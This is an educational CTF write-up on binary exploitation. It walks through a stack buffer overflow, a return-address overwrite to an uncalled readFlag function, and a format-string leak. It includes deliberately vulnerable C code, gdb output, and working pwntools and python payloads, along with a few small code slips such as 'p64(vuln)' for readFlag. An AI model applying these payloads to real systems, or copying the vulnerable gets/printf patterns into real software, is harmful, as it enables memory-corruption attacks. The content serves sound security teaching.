# Binary Exploitation

## Prerequisite
* Gnu debugger: gdb (you can use pwndbg/gdb-peda/gef to get better view)
* UNIX like operating system to run the ELF (binary file)
* Decompiler to get better understanding of the binary file itself (Ghidra/Hopper/IDA)
* pwntool module

## Usually these are the method to solve Simple Binary Exploitation

* Brute Force
* Use gdb and Decompiler
* Use pwn modules on python

## Classic Buffer Overflow

given the problem in example1.c (bof0 ctfhaha)

```c
void readFlag(){
	char flag[32];
	FILE *fptr;
	fptr = fopen("flag.txt", "r");
	fread(&flag, sizeof(char), 32, fptr);
	puts(flag);
}

void vuln(){
	char input[8];
	char string[8] = "UwU";
	printf("your input: ");
	gets(input);

	printf("string is: %s\n", string);

	if(strcmp(string, ">w<") == 0){
		puts("congrats! here's your flag");
		readFlag();
	}
	else{
		printf("not yet :(\nkeep trying!\n");
	}
}

int main(){
	setbuf(stdout, NULL);
	puts("hi! change the string to >w< and you'll get your flag!");
	vuln();
	return 0;
}
```
If you look closely it has gets function, it didn't specify the buffer size so we can overflow it.  
you can check the manual page of gets function with
```
man gets
```

The manual page says:
```
gets()  reads  a  line  from  stdin into the buffer pointed to by s until either a terminating newline or EOF,
which it replaces with a null byte ('\0').  No check for buffer overrun is performed
```

if we run the binary with `./example1` we will get

```
hi! change the string to >w< and you'll get your flag!
your input:
```


you can try to brute force it by using `pwn cyclic` or `pattern create` in gef. for example:
```
pwn cyclic 16
aaaabaaacaaadaaa
```

it will create cyclic pattern that can determine spesific offset. if we input it to the system we will get
```
hi! change the string to >w< and you'll get your flag!
your input: aaaabaaacaaadaaa
string is: caaadaaa
not yet :(
keep trying!
```
if we examine carefully, we have overwritten the `string[8]` with our input. Because the size of `input` variable is 8 bytes, if we supply the gets with more than 8 character it will overflow. In this case it will overflowing `string[8]`.  

so the input has to be 8*`randomcharacter`+ >w<. Lets just A for the padding. so the payload will be
```
AAAAAAAA>w<
```

supply the payload in the binary and we got the flag.

flag `CTF{buffer_overflo0o0o0ow}`

## Overwrite return address 

given the problem in example2.c (b0f1.c)
```c
void readFlag(){
	char flag[32];
	FILE *fptr;
	fptr = fopen("flag.txt", "r");
	fread(&flag, sizeof(char), 32, fptr);
	puts(flag);
}

void vuln(){
	char string[8] = "UwU";
	char input[8];
	
	printf("your input: ");
	gets(input);

	printf("string is: %s\n", string);

	if(strcmp(string, ">w<") == 0){
		puts("so what?");
	}
	else{
		printf("not yet :(\nkeep trying!\n");
	}
}

int main(){
	setbuf(stdout, NULL);
	puts("hi! change the string to >w< and we'll see what happens!");
	vuln();
	return 0;
}
```

if we look carefully there are readFlag function that read and also puts the flag. But int main function we didn't call readFlag at all, we only call vuln. So how to execute the readFlag function without having in the main function?  

vuln function still use gets, meaning it didn't save, it pwnable so we can exploit that and overwrite the return addres of vuln function to readFlag function.  

you can use decompiler or gdb to examine the function. lets use the default which is gdb and others default tools.  
```
readelf -s ./example2
```

to display all functions

```
    ...
    53: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
    54: 0000000000601050     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
    55: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND strcmp@@GLIBC_2.2.5
    56: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    57: 0000000000601058     0 OBJECT  GLOBAL HIDDEN    23 __dso_handle
    58: 0000000000400860     4 OBJECT  GLOBAL DEFAULT   15 _IO_stdin_used
    59: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gets@@GLIBC_2.2.5
    60: 00000000004007e0   101 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
    61: 0000000000601070     0 NOTYPE  GLOBAL DEFAULT   24 _end
    62: 0000000000400620     2 FUNC    GLOBAL HIDDEN    13 _dl_relocate_static_pie
    63: 00000000004005f0    43 FUNC    GLOBAL DEFAULT   13 _start
    64: 0000000000601060     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start
    65: 00000000004007a0    53 FUNC    GLOBAL DEFAULT   13 main
    66: 00000000004006d7    75 FUNC    GLOBAL DEFAULT   13 readFlag
    67: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND fopen@@GLIBC_2.2.5
    68: 0000000000601060     0 OBJECT  GLOBAL HIDDEN    23 __TMC_END__
    69: 0000000000400558     0 FUNC    GLOBAL DEFAULT   11 _init
```

readFlag address: `00000000004006d7`

We need to find insert breakpoint before and after we input to examine the stack

```
gdb ./example
```
to run the gdb  

because our input in the vuln function we can disas vuln by using:

```
disas vuln

Dump of assembler code for function vuln:
   0x0000000000400722 <+0>:     push   rbp
   0x0000000000400723 <+1>:     mov    rbp,rsp
   0x0000000000400726 <+4>:     sub    rsp,0x10
   0x000000000040072a <+8>:     mov    QWORD PTR [rbp-0x8],0x557755
   0x0000000000400732 <+16>:    lea    rdi,[rip+0x13a]        # 0x400873
   0x0000000000400739 <+23>:    mov    eax,0x0
   0x000000000040073e <+28>:    call   0x4005b0 <printf@plt>
   0x0000000000400743 <+33>:    lea    rax,[rbp-0x10]
   0x0000000000400747 <+37>:    mov    rdi,rax
   0x000000000040074a <+40>:    mov    eax,0x0
   0x000000000040074f <+45>:    call   0x4005d0 <gets@plt>
   0x0000000000400754 <+50>:    lea    rax,[rbp-0x8]
   0x0000000000400758 <+54>:    mov    rsi,rax
   0x000000000040075b <+57>:    lea    rdi,[rip+0x11e]        # 0x400880
   0x0000000000400762 <+64>:    mov    eax,0x0
   0x0000000000400767 <+69>:    call   0x4005b0 <printf@plt>
   0x000000000040076c <+74>:    lea    rax,[rbp-0x8]
   0x0000000000400770 <+78>:    lea    rsi,[rip+0x118]        # 0x40088f
   0x0000000000400777 <+85>:    mov    rdi,rax
   0x000000000040077a <+88>:    call   0x4005c0 <strcmp@plt>
   0x000000000040077f <+93>:    test   eax,eax
   0x0000000000400781 <+95>:    jne    0x400791 <vuln+111>
   0x0000000000400783 <+97>:    lea    rdi,[rip+0x109]        # 0x400893
   0x000000000040078a <+104>:   call   0x400580 <puts@plt>
   0x000000000040078f <+109>:   jmp    0x40079d <vuln+123>
```

lets insert breakpoint at `0x000000000040074a` and `0x0000000000400754`
```
b*0x000000000040074a
Breakpoint 1 at 0x40074a
b*0x0000000000400754
Breakpoint 2 at 0x400754
```

hit `r` after we insert breakpoint to run the gdb

```
stack
0x00007fffffffdac0│+0x0000: 0x00000000004005f0  →  <_start+0> xor ebp, ebp       ← $rax, $rsp, $rdi
0x00007fffffffdac8│+0x0008: 0x0000000000557755 ("UwU"?)
0x00007fffffffdad0│+0x0010: 0x00007fffffffdae0  →  0x0000000000000000    ← $rbp
0x00007fffffffdad8│+0x0018: 0x00000000004007ce  →  <main+46> mov eax, 0x0
0x00007fffffffdae0│+0x0020: 0x0000000000000000
0x00007fffffffdae8│+0x0028: 0x00007ffff7deb0b3  →  <__libc_start_main+243> mov edi, eax
0x00007fffffffdaf0│+0x0030: 0x00007ffff7ffc620  →  0x0005044800000000
0x00007fffffffdaf8│+0x0038: 0x00007fffffffdbd8  →  0x00007fffffffde18  →  "/mnt/d/Coding/CTFs/CTFHaha/bof1/bof1"

registers
$rbp   : 0x00007fffffffdad0  →  0x00007fffffffdae0  →  0x0000000000000000
$rsi   : 0x00007fffffffb420  →  "your input: "
$rdi   : 0x00007fffffffdac0  →  0x00000000004005f0  →  <_start+0> xor ebp, ebp
$rip   : 0x000000000040074a  →  <vuln+40> mov eax, 0x0
```

if we look at the stack before input, the rip points to the return address of the vuln function. To run the readFlag function we must replace `0x000000000040074a` by readFlag address.

so try to use the `cyclic` or `pattern create` in gef to find the offset (we know its 24 just to make sure)  

```
pattern create 24
aaaabaaacaaadaaaeaaafaaa
```

lets supply to our input

```
stack
0x00007fffffffdac0│+0x0000: "aaaabaaacaaadaaaeaaafaaa"   ← $rax, $rsp, $r8
0x00007fffffffdac8│+0x0008: "caaadaaaeaaafaaa"
0x00007fffffffdad0│+0x0010: "eaaafaaa"   ← $rbp
0x00007fffffffdad8│+0x0018: 0x0000000000400700  →  <readFlag+41> sar DWORD PTR [rdx+0x20], 1
0x00007fffffffdae0│+0x0020: 0x0000000000000000
0x00007fffffffdae8│+0x0028: 0x00007ffff7deb0b3  →  <__libc_start_main+243> mov edi, eax
0x00007fffffffdaf0│+0x0030: 0x00007ffff7ffc620  →  0x0005044800000000
0x00007fffffffdaf8│+0x0038: 0x00007fffffffdbd8  →  0x00007fffffffde18  →  "/mnt/d/Coding/CTFs/CTFHaha/bof1/bof1"
```
before input `$rip : 0x40074a` now `$rip : 0x400700` we have successfully change from 4a to 00 (because if we input 24 character the 25 character will be nullbytes which is \x00)  

So arrange the payload with padding 24 character and the readFlag address (remember we must change it to little endian first)

to change to little endian form you can use `pwntool`

```
>>> import pwn
>>> pwn.p64(0x00000000004006d7)
b'\xd7\x06@\x00\x00\x00\x00\x00'
```

our payload is nonprintable character so how can we arrange it?  
you can use either 
```
python -c "print('A'*24 + '\xd7\x06@\x00\x00\x00\x00\x00')" | ./example1
```
or
```
offeset = 24
readFlag = 0x00000000004006d7
payload = b'A' * offeset
payload += p64(vuln)

use

p.sendline(payload)
p.interactive()
```
to send the payload and enter interactive mode and youll get the flag.

flag `CTF{ch4ng3_th3_progr4m_fl0o0w}`

## Fstring
given the problem in example3.c (fstr0)
```c
// gcc fstr0.c -o fstr0

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void readFlag(char* flag) {
        FILE *fptr;
        fptr = fopen("flag.txt", "r");
        fread(flag, sizeof(char), 32, fptr);
}

void vuln() {
        char flag[32];
        char name[256];
        readFlag(flag);
        puts("what's your name?");
        fgets(name, 256, stdin);
        printf("hello, ");
        printf(name);
}

int main() {
        setbuf(stdout, NULL);
        puts("hi, welcome to fstring!");
        vuln();
        return 0;
}
```
As we can see the input is sanitized by using fgets, it only accept 256 character so we cannot buffer offervlow it.  But if we look more closely, at the last line of vuln function there is `printf(name);`. F in printf stands for formatting. It can format our variabel with our desired format.  

for example:
```
printf("%d %d %d %d %d", 1, 2, 3, 4, 5);
will output: 1 2 3 4 5
```
we can also specify our desired format with `%n$...` for example:
```
printf("%2$d %1$d %3$d %5$d %4$d", 1, 2, 3, 4, 5);
will output : 2 1 3 5 4
```
See the difference? So how can we exploit the formatting string. if we didn't specify any formatting in printf we can exploit it by using the format string itself. wait whattt? how?  

because the printf didn't specify any formatting we can use for example: `%x` to print hexadecimal number but what hexadecimal would the printf print? becuase we input %x, the printf think that it needs hexadecimal number and it will grab one from the stack itself. if we put `%x %x %x %x %x` it will grab 5 hexadecimal from the stack because we didn't give the printf function to print to.  

if we run the binary it will ask for input and if we use `%p %p %p %p %p`
```
hi, welcome to fstring!
what's your name?
%x %x %x %x %x
hello, 0x7ffc01c289e0 0x7fdebadae8c0 (nil) 0x7 (nil)
```

as you can see it will output random value from the stack. if we look carefully the readFlag function is inside the vuln function itself so the flag must be in the stack, so we just need to find where the flag is. We can use `%x` or `%p` or even `%ld`  

```
hi, welcome to fstring!
what's your name?
%p %p %p %p %p %p %p %p %p %p
hello, 0x7fff91459780 0x7fb7ed9758c0 (nil) 0x7 (nil) 0x5f6573757b465443 0x635f66746e697270 0x796c6c7566657261 0x7f7d7a6c705f 0x7025207025207025

run the function again 1 more time

hi, welcome to fstring!
what's your name?
%p %p %p %p %p %p %p %p %p %p
hello, 0x7ffc069220b0 0x7f9093e858c0 (nil) 0x7 (nil) 0x5f6573757b465443 0x635f66746e697270 0x796c6c7566657261 0x7f7d7a6c705f 0x7025207025207025
```

as you can see the first and second output is different. This happen because the aslr is active. ASLR stands for Address Space Layout Randomization or we can use `checksec` to check it
```
checksec example2
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
PIE (Positition Independent Executable) we can see the same as ASLR so it will make our function have offset so it will behave differently everytime. But as you can see the 6th address is the same, so maybe this is the flag?
```
convert this to ascii 0x5f6573757b465443 0x635f66746e697270 0x796c6c7566657261 0x7f7d7a6c705f using python we get 0x70252070252070255 

it will give _esu{FTCc_ftnirpyllufera}zlp_p% p% p%
```

it looks like the flag but reverse, remember our machine use little endian so we must reverse the byte itself to get the correct flag. After we reverse it we get the flag
```py
flag = "0x5f6573757b465443-0x635f66746e697270-0x796c6c7566657261-0x7f7d7a6c705f"
arrflag = flag.split("-")

ans = b''
for item in arrflag:
  ans += p64(int(item, 16))

print(ans.decode())
```
and we get our desired flag: `CTF{use_printf_carefully_plz}`
